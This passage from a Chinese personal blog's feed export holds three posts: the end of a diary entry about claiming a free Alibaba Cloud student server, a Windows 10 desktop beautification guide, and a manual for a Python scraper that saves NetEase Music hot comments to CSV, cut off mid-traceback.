浏览器（版本：73及以上的正式版本），或Firefox浏览器（版本：66及以上的正式版本)</p></blockquote><p>反正我做下来也挺简单的，拿了个80分，不会的可以去百度一下，10分钟10道题时间绝对够</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@diary5/img/Diary5/Server-information.png" alt="服务器相关信息"></p><p>然后回到页面，你就有资格领取服务器啦！建议早上八点蹲点领取哦~</p><p>如果你是教师，你还可以通过教师认证，拿多一台服务器，岂不美哉？</p><p>阿里云活动规则如下：</p><blockquote><div class="ace-dialog-body"><div><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000" data-spm-anchor-id="a2c6h.13788107.0.i4.602b61a8cBLXd6">一、活动对象：国内全日制在校学生 </span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">二、符合以下条件用户可参与： </span></span></span></p><ul><li><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">阿里云注册且个人实名认证用户</span></span></span></li><li><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">完成学生认证</span></span></span></li><li><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">完成学习课程并通过测试</span></span></span></li></ul><p></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">三、活动规则</span></span></span></p><p data-spm-anchor-id="a2c6h.13788107.0.i2.602b61a8cBLXd6"><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">1.全日制在校大学生，需同时完成阿里云个人实名认证、学生认证，且两者信息一致，认证通过后，完成学生计划的学习课程，并通过测试，同一用户可免费领取1台云服务器ECS（仅限当前未保有 ECS用户 ）和学习课程资源。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">2.学生计划提供的云服务器ECS产品数额有限，每天8点开放固定领取名额 ，先到先得，领完即止。用户领取时应确认地域等相关选择信息，开通后不允许更改配置。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">3.学生计划用户免费领取的云服务器ECS，有效期自领取日起6个月内有效。用户学生认证在有效期内且有效时长大于等于6个月的用户，云服务器ECS到期释放前30天内，可登录个人中心，参加阶段性学习考试，测试通过，可免费续期1次，时长为6个月，续费实例规格需跟领取时一致才可享受。使用过程中如需对领取产品进行升级，请按照标准费用进行升级。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">4.如学生用户账号下存在正在使用的ECS产品或已通过云翼计划购买或未支付订单，会导致系统对用户领取资格的审核无法通过；在此情况下，用户ECS产品到期释放后、作废相应的未支付订单后，方可正常参与相应产品的领取。 </span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">5.参与阿里云高校在家实践计划的学生用户，同一用户最多可保有2台云服务器ECS，指包括满足学生计划条件用户，领取的1台云服务器ECS（同一用户限领1台），和通过教师计划，满足实名认证和学生认证条件用户，获得教师提供兑换码，验证成功，领取的1台云服务器ECS（同一用户限领1台）。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">6.参与阿里云高校在家实践计划的学生用户，通过教师提供兑换码，领取的云服务器ECS，仅用于教师指定课程学习使用，课程结束后，请及时保存相关数据并进行ECS资源释放。如需继续使用，请自行进行续费操作。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">7.用户参与阿里云高校在家实践计划（含学生计划）所获得的相应权益，仅限本人使用，不得转让、出售或以其他方式换取利益。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">8.为保证活动的公平公正，阿里云有权对恶意刷抢（如通过程序等技术手段）活动资源，长期资源闲置 ，利用资源从事违法违规行为的用户收回免费领取ECS使用资格。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">9.如用户在活动中存在隐瞒、虚构、作弊、欺诈或通过其他非正常手段规避活动规则、获取不当利益的行为，例如：作弊领取、恶意套现、网络攻击、虚假交易等，阿里云有权收回相关权益、取消用户的活动参与资格，撤销违规交易，必要时追究违规用户的法律责任。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">10.活动名称仅为方便用户理解参考使用，不具有效力，实际活动内容以具体活动规则为准。</span></span></span></p><p></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">四、名词及解释</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">1.“阿里云官网”，是指包含域名为www.aliyun.com的网站以及阿里云客户端，如APP，但阿里云国际站，包括alibabacloud.com以及所有下属页面和jp.aliyun.com以及所有下属页面除外。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">2.“同一用户”，是指根据不同阿里云账号在注册、登录、使用中的关联信息，阿里云判断其实际为同一用户。关联信息包括但不限于同一证件号、同一手机号、同一支付账号、同一设备、同一地址等。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">3.“同人账号”，是指同一用户拥有多个阿里云账号的，各个账号之间互为同人账号。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">4. “指定云产品”，是指某场具体活动列举的云产品（如上文所提ECS）。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">5.除非有相反证据证明外，用户参与活动所获得的全部权益和相应责任，均归属于参与活动的该阿里云账号所对应的实名认证主体。</span></span></span></p><p><span style="letter-spacing:0px"><span style="line-height:1.5"><span style="color:#000000">6.阿里云可以根据活动的实际情况对活动规则进行变动或调整，相关变动或调整将公布在活动页面上，并于公布时即时生效；但不影响用户在活动规则调整前已经获得的权益。</span></span></span></p></div></div></blockquote><p><strong>不说了，我要去白嫖了！</strong></p>]]></content>
      
      
      <categories>
          
          <category> diary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> diary </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Windows10美化笔记</title>
      <link href="/posts/Windows10-Beautify/"/>
      <url>/posts/Windows10-Beautify/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>这几天在折腾Win10的美化，本来是想在<a href="https://zhutix.com/tag/win10-zhuti/">某美化网站</a>上下载主题包来美化的（这里有两个美化主题包需要自取 <a href="https://www.lanzous.com/i9zex0b">主题①</a> | <a href="https://www.lanzous.com/i9zewch">主题②</a>），但是实在是太麻烦了（<a href="https://zhutix.com/study/win10-jc/">具体怎么麻烦我把教程放出来你们感受一下</a>），于是我决定自己来……</p><hr><p>最后效果如图↓</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Windows10-Beautify/img/Windows10-Beautify/Result.jpg" alt="美化结果"></p><hr><h4 id="第一步：寻找壁纸"><a href="#第一步：寻找壁纸" class="headerlink" title="第一步：寻找壁纸"></a>第一步：寻找壁纸</h4><p>壁纸这个问题，当然是要去P站啦（当然是Pixiv啦，在想什么啦）</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Windows10-Beautify/img/Windows10-Beautify/Pixiv-Search-Wallpaper.png" alt="壁纸搜索"></p><p>因为是美化向，所以壁纸的风格建议是不要太辣眼睛。这里的辣眼睛是指颜色不要太多，色差不要太大，我这里找的图是一张颜色集中在蓝色的图片，地址在这里<a href="https://www.pixiv.net/artworks/79898339">https://www.pixiv.net/artworks/79898339</a>（图片太大，一张图15.2MB，就不放原图了）</p><p>像下面这两张图这样的，第一张太亮，第二章色彩太繁杂的我是真的不推荐，当然你喜欢那我也没什么说的嘛</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Windows10-Beautify/img/Windows10-Beautify/unrecommand1.png" alt="不推荐类型1：太亮"></p><p>原图地址：<a href="https://www.pixiv.net/artworks/79925515">https://www.pixiv.net/artworks/79925515</a></p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Windows10-Beautify/img/Windows10-Beautify/unrecommand2.png" alt="不推荐类型2：色彩繁杂"></p><p>原图地址：<a href="https://www.pixiv.net/artworks/79923171">https://www.pixiv.net/artworks/79923171</a></p><p>如果有人执意使用过量的图片的话，我这里有个建议，可以到PS里面把图片的亮度拉低一点，这样子不会看起来那么亮眼。</p><h3 id="第二步：安装插件"><a href="#第二步：安装插件" class="headerlink" title="第二步：安装插件"></a>第二步：安装插件</h3><p>这里我安装的插件有以下几个：</p><p>1、<a href="http://www.yynote.cn/">小黄条TODO</a></p><p>2、<a href="https://www.rainmeter.net/">雨滴桌面</a></p><p>3、<a href="https://www.microsoft.com/store/apps/9PF4KZ2VN4W9">TranslucentTB</a> 丨 <a href="%5Bhttps://www.microsoft.com/zh-cn/p/translucenttb-%E6%B1%89%E5%8C%96-by-tpxxn/9n5w18jc9bg2%5D(https://www.microsoft.com/zh-cn/p/translucenttb-%E6%B1%89%E5%8C%96-by-tpxxn/9n5w18jc9bg2)">汉化版</a> 丨 <a href="https://github.com/TranslucentTB/TranslucentTB">Github</a>（<a href="https://github.com/tpxxn/TranslucentTB">汉化</a>）（微软商店有，可以自己去微软商店里面搜索）</p><p>第一个是一个ToDo的列表，就是我左上角的那个Todo列表，有点类似便签，免费版绝对够个人使用，付费也就是多了云端存储而已</p><p>第二个相信不用多说，桌面小挂件，雨滴桌面非常好用</p><p>第三个是任务栏透明，可以调整各种参数，例如窗口最大化后任务栏的外观等等，微软商店有，如果上面的链接打不开就去微软商店里面搜索</p><h3 id="第三步：放置图标"><a href="#第三步：放置图标" class="headerlink" title="第三步：放置图标"></a>第三步：放置图标</h3><p>如果真的要美化，相信微软自带的自动排列图标只是一个累赘，所以我们要把它关掉，然后把图标放在自己喜欢的位置。我的建议是把图标放在壁纸偏暗的地方或者是色块比较均匀的地方，没有太多的颜色变化的地方。放好了以后，各种应用的图标摆在一起，风格也不统一，我们就需要使用图标包来替换。</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Windows10-Beautify/img/Windows10-Beautify/icon-change.png" alt="图标更换"></p><p>这里我使用的是Pure轻雨图标包，在酷安上有手机版，电脑的这一套是我从网上找的，但是我没法发出来（蓝奏云的限制太烦了），所以还是请你们自己去网上找吧，当然你也可以使用其他的图标包。右击桌面上的快捷方式，选到属性，然后选更改图标，选到自己的图标点确定即可</p><p>把自己的应用图标更改好，放在自己喜欢的位置，就完成了图标的管理工作</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Windows10-Beautify/img/Windows10-Beautify/icon-list.jpg" alt="图标放置"></p><h3 id="第四步：配置雨滴"><a href="#第四步：配置雨滴" class="headerlink" title="第四步：配置雨滴"></a>第四步：配置雨滴</h3><p>雨滴的小挂件就是它的亮点，我们需要配置一下自己的小挂件。我这里分享一些小挂件，需要的同学可以自己拿 <a href="https://www.lanzous.com/b0e1msmzi">传送门</a></p><p>一开始雨滴的那些黑色的挂件太丑了，我们可以右键它选择关闭皮肤来删除掉它</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Windows10-Beautify/img/Windows10-Beautify/rainmeter-default-welcome.jpg" alt="雨滴默认欢迎界面"></p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Windows10-Beautify/img/Windows10-Beautify/rainmeter-default-welcome-delete.jpg" alt="关闭欢迎界面"></p><p>皮肤共有两种安装方式：如果你拿到的是后缀名为<code>.rmskin</code>的，恭喜你，这是安装最简单的皮肤，直接双击安装即可！但是如果你拿到的是一个文件夹，别担心。你可以访问目录</p><p><code>C:\Users\%USERNAME%\Documents\Rainmeter\Skins</code>，将自己的皮肤拖入；或者直接右击托盘里面的雨滴，选到皮肤，打开皮肤目录，也可以打开这个文件夹。拖入后右击托盘中的雨滴，点击管理，然后点击左下角的刷新全部就可以载入皮肤了！</p><p>然后就右击托盘里面的雨滴图标，选择皮肤，再选择自己的皮肤包里面的所需挂件，点击就可以加入到桌面上了</p><p><img src="https://cdn.jsdelivr.net/gh/GamerNoTitle/Picture-repo-v1@Windows10-Beautify/img/Windows10-Beautify/rainmeter-add.jpg" alt="加入挂件"></p><p>将挂件拖动到合适的位置，你就完成自己的美化啦！</p><hr><h3 id="我的皮肤配置："><a href="#我的皮肤配置：" class="headerlink" title="我的皮肤配置："></a>我的皮肤配置：</h3><p>Live 4 Music\In  Out</p><p>Live 4 Music\DIgital Circles</p><p>Live 4 Music\Cpu  Ram</p><p>Simple Clean\音乐频谱</p><p>系统信息Bars_II_by_Rasylver\Bars II\WIFI</p><p>系统信息Bars_II_by_Rasylver\Bars II\RAM</p><p>系统信息Bars_II_by_Rasylver\Bars II\CPU</p><p>这些皮肤在我发的文件里面都有，链接在上面，需要的可以自己取用。</p><hr><h3 id="题外话："><a href="#题外话：" class="headerlink" title="题外话："></a>题外话：</h3><p>二月就过去了，学校还没开学，上网课感觉不是很在状态……</p><p>下周土命2就开新赛季了，本赛季等级120，下赛季冲个35就好了</p><p>想玩VR……</p>]]></content>
      
      
      <categories>
          
          <category> Software </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Software </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Netease-Comment-Spider 网易云音乐热评爬虫使用手册</title>
      <link href="/posts/Netease-Comment-Spider/"/>
      <url>/posts/Netease-Comment-Spider/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>今天有人申请适配网易云音乐热评的api，反正也没啥事干，就做一个吧！</p><p>如果你想看使用手册，那么请你直接往下拉跳过制作过程</p><p><strong>观前提示：可以点击左下角点开导航栏阅读，项目地址：<a href="https://github.com/GamerNoTitle/Netease-Comment-Spider">https://github.com/GamerNoTitle/Netease-Comment-Spider</a></strong></p><hr><h3 id="制作过程"><a href="#制作过程" class="headerlink" title="制作过程"></a>制作过程</h3><p>本程序是调用的<a href="https://www.mouse123.cn/api/163/api.php">https://www.mouse123.cn/api/163/api.php</a>这个api，会返回很多数据，下面是一个返回的例子</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;song_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;118&quot;</span><span class="punctuation">,</span><span class="attr">&quot;title&quot;</span><span class="punctuation">:</span><span class="string">&quot;Wolves&quot;</span><span class="punctuation">,</span><span class="attr">&quot;images&quot;</span><span class="punctuation">:</span><span class="string">&quot;https:\/\/p1.music.126.net\/-nQ2E-8ZjuwGtMipBTYzBw==\/17902248323721194.jpg&quot;</span><span class="punctuation">,</span><span class="attr">&quot;author&quot;</span><span class="punctuation">:</span><span class="string">&quot;Selena Gomez&quot;</span><span class="punctuation">,</span><span class="attr">&quot;album&quot;</span><span class="punctuation">:</span><span class="string">&quot;Wolves&quot;</span><span class="punctuation">,</span><span class="attr">&quot;description&quot;</span><span class="punctuation">:</span><span class="string">&quot;\u6b4c\u624b\uff1aSelena Gomez\u3002\u6240\u5c5e\u4e13\u8f91\uff1aWolves\u3002&quot;</span><span class="punctuation">,</span><span class="attr">&quot;pub_date&quot;</span><span class="punctuation">:</span><span class="string">&quot;2017-10-24 16:00:00&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;1510&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment_user_id&quot;</span><span class="punctuation">:</span><span class="string">&quot;333845131&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment_nickname&quot;</span><span class="punctuation">:</span><span class="string">&quot;Stroyberry&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment_avatar_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;https:\/\/p2.music.126.net\/D7Z2xViXVpB7xH3m5NxDIw==\/109951164448917887.jpg&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment_content&quot;</span><span class="punctuation">:</span><span class="string">&quot;\ud83d\udc95\u5bf9\u65b0\u6b4c\u6709\u8bf4\u4e0d\u51fa\u7684\u611f\u89c9\uff0csel\u7684\u58f0\u97f3\u8f7b\u5feb\u5374\u53c8\u5f88\u968f\u6027\uff0c\u50cf\u662f\u8ffd\u72fc\u5374\u53c8\u9a7e\u9a6d\u7740\uff0c\u5b8c\u7f8e\u7684future bass\u8ba9\u4f60\u65e0\u6cd5\u81ea\u62d4\u554a\uff01sel\u548c\u68c9\u82b1\u7cd6\u8fd9\u6837\u795e\u7ea7\u7684\u78b0\u649e\ud83d\udca5\u8ba9\u4eba\u7a92\u606f\uff01\u5feb\u5e26\u4e0a\u8033\u673a\ud83c\udfa7\uff01\u95ed\u4e0a\u773c\u775b\uff01\u4e00\u8d77\u7a7f\u68ad\u4e8e\u4e1b\u6797\u4e4b\u4e2d\ud83d\ude0f&quot;</span><span class="punctuation">,</span><span class="attr">&quot;comment_pub_date&quot;</span><span class="punctuation">:</span><span class="string">&quot;2017-10-26 22:23:26&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>这个返回的数据看上去很复杂，但是分析一下，返回的还是json格式，那么这个东西的解析就跟<a href="http://bili33.top/2020/02/11/Hitokoto-Spider/">一言的那个项目</a>是一样的，根据上面的信息，我把config.json的可选配置分成了以下几个</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Netease.csv&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;times&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;delay&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="number">60</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;song_id&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;images&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;album&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pub_date&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;comment_user_id&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;comment_avatar_url&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;comment_pub_date&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>path</code>为文件输出的路径，文件以csv格式输出，请务必带文件后缀！</p><p><code>times</code>为抓取次数，支持大于0的整数，直接输入数字即可！</p><p><code>delay</code>表示抓取一次得到结果以后等待的时长，为了不给api提供商造成太大的服务器负担，我强烈建议设置此项，填入大于等于0的整数即可，单位是秒</p><p><code>timeout</code>表示连接超时时长，支持大于5的整数</p><p><code>song_id</code>为歌曲的id，如果开启将把歌曲id写入csv文档，只支持true或false</p><p><code>images</code>表示是否抓取图片，这是专辑封面，将保存到<code>&quot;.\albums&quot;</code>文件夹并命名为对应的评论ID，只支持true或false</p><p><code>album</code>表示歌曲来源专辑，如果开启将把专辑名写入csv文件，只支持true或false</p><p><code>description</code>表示歌曲的描述，如果开启将把描述写入csv文件，只支持true或false</p><p><code>pub_date</code>表示歌曲发行的时间，如果开启将把时间写入csv文档，格式为<code>YYYY-MM-DD HH:MM:SS</code>，只支持true或false</p><p><code>comment_user_id</code>表示评论的用户的id，如果开启将把id写入csv文档，只支持true或false</p><p><code>comment_avatar_url</code>表示评论用户的头像，如果开启将把头像存瑞<code>.\avatars</code>文件夹并命名为对应的评论ID，只支持true或false</p><p><code>comment_pub_date</code>表示评论发布的时间，如果开启将把时间写入csv文档，格式为<code>YYYY-MM-DD HH:MM:SS</code>，只支持true或false</p><p>搞定可选配置以后，把<a href="http://bili33.top/2020/02/11/Hitokoto-Spider/">一言的那个项目</a>拿过来当模板，然后把变量名称往里面套，很快就做好了一个程序。但是这个api返回的数据还是有些不一样的，其中就返回了<code>专辑封面的URL</code>、<code>评论用户的头像URL</code>，这两个URL可以让我们获取到相应的图片</p><p>另外，这个api返回的编码格式是Unicode，与一言直接返回中文不一样，我本来想做一个Unicode直接转成gbk保存的功能，但是最后只能以UTF8保存<em>（有能做出相应功能的大佬欢迎提交PR）</em></p><p>我使用了requests直接获取图片的二进制码，然后将其写入一个文件来达到保存功能，具体实现方式如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(conf[<span class="string">&#x27;images&#x27;</span>]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在保存专辑封面……&quot;</span>)</span><br><span class="line">    image = r.get(data[<span class="string">&#x27;images&#x27;</span>]).content</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./images/&#x27;</span> + data[<span class="string">&#x27;comment_id&#x27;</span>] + <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(image)</span><br><span class="line"><span class="keyword">if</span>(conf[<span class="string">&#x27;comment_avatar_url&#x27;</span>]):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;正在保存评论用户头像……&quot;</span>)</span><br><span class="line">    image = r.get(data[<span class="string">&#x27;comment_avatar_url&#x27;</span>]).content</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./avatars/&#x27;</span> + data[<span class="string">&#x27;comment_id&#x27;</span>] + <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(image)</span><br></pre></td></tr></table></figure><p>这样就可以保存图片了，但是对应的文件夹不能够删除，否则会出现找不到文件的BUG~</p><hr><h3 id="使用手册"><a href="#使用手册" class="headerlink" title="使用手册"></a>使用手册</h3><h4 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h4><p>基本功能就有从api获取对应的信息，并将其存入csv文件，固定有的信息是<code>comment_id</code>、<code>comment_username</code>、<code>title</code>、<code>author</code>、<code>comment_content</code>这几个信息，另外可选的在config.json中进行修改</p><p>输出的csv文件目前是以UTF8的编码保存的，如果想要在Excel中查看，你需要使用vscode之类的文本编辑器更改保存的编码方式为gbk才能够在Excel中查看，否则会乱码</p><h4 id="可选配置"><a href="#可选配置" class="headerlink" title="可选配置"></a>可选配置</h4><p>克隆了代码以后，在目录下有一个config.json文件，在config.json文件可以对选项进行启用</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Netease.csv&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;times&quot;</span><span class="punctuation">:</span> <span class="number">100</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;delay&quot;</span><span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;timeout&quot;</span><span class="punctuation">:</span> <span class="number">60</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;song_id&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;images&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;album&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;description&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;pub_date&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;comment_user_id&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;comment_avatar_url&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;comment_pub_date&quot;</span><span class="punctuation">:</span> <span class="keyword">false</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>path</code>为文件输出的路径，文件以csv格式输出，请务必带文件后缀！</p><p><code>times</code>为抓取次数，支持大于0的整数，直接输入数字即可！</p><p><code>delay</code>表示抓取一次得到结果以后等待的时长，为了不给api提供商造成太大的服务器负担，我强烈建议设置此项，填入大于等于0的整数即可，单位是秒</p><p><code>timeout</code>表示连接超时时长，支持大于5的整数</p><p><code>song_id</code>为歌曲的id，如果开启将把歌曲id写入csv文档，只支持true或false</p><p><code>images</code>表示是否抓取图片，这是专辑封面，将保存到<code>&quot;.\albums&quot;</code>文件夹并命名为对应的评论ID，只支持true或false</p><p><code>album</code>表示歌曲来源专辑，如果开启将把专辑名写入csv文件，只支持true或false</p><p><code>description</code>表示歌曲的描述，如果开启将把描述写入csv文件，只支持true或false</p><p><code>pub_date</code>表示歌曲发行的时间，如果开启将把时间写入csv文档，格式为<code>YYYY-MM-DD HH:MM:SS</code>，只支持true或false</p><p><code>comment_user_id</code>表示评论的用户的id，如果开启将把id写入csv文档，只支持true或false</p><p><code>comment_avatar_url</code>表示评论用户的头像，如果开启将把头像存瑞<code>.\avatars</code>文件夹并命名为对应的评论ID，只支持true或false</p><p><code>comment_pub_date</code>表示评论发布的时间，如果开启将把时间写入csv文档，格式为<code>YYYY-MM-DD HH:MM:SS</code>，只支持true或false</p><p>上面这些参数根据自己的需要进行设置即可！需要注意的是如果开启了<code>images</code>和<code>comment_avatar_url</code>选项那么不能够删除<code>avatars</code>和<code>images</code>文件夹，否则会报错！！！</p><h4 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q &amp; A"></a>Q &amp; A</h4><h5 id="Q-Errno-2-No-such-file-or-directory"><a href="#Q-Errno-2-No-such-file-or-directory" class="headerlink" title="Q: [Errno 2] No such file or directory"></a>Q: [Errno 2] No such file or directory</h5><p>如果你在使用本程序的时候出现了以下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;main.py&quot;</span>, line 107, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">    with open(<span class="string">&#x27;images/&#x27;</span> + data[<span class="string">&#x27;comment_id&#x27;</span>] + <span class="string">&#x27;.jpg&#x27;</span>, <span class="string">&#x27;wb&#x27;</span>) as f:</span><br><span class="line">FileNotFoundError: [Errno 2] No such file or directory: <span class="string">&#x27;images/xxx.jpg&#x27;</span> </span><br><span class="line"><span class="comment"># 此处xxx应为某一个数字</span></span><br></pre></td></tr></table></figure><p>A: 请你检查是否删除了<code>avatars</code>文件夹或<code>images</code>文件夹！</p><hr><h5 id="Q-KeyboardInterrupt"><a href="#Q-KeyboardInterrupt" class="headerlink" title="Q: KeyboardInterrupt"></a>Q: KeyboardInterrupt</h5><p>如果你在使用本程序的时候出现了以下错误：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span 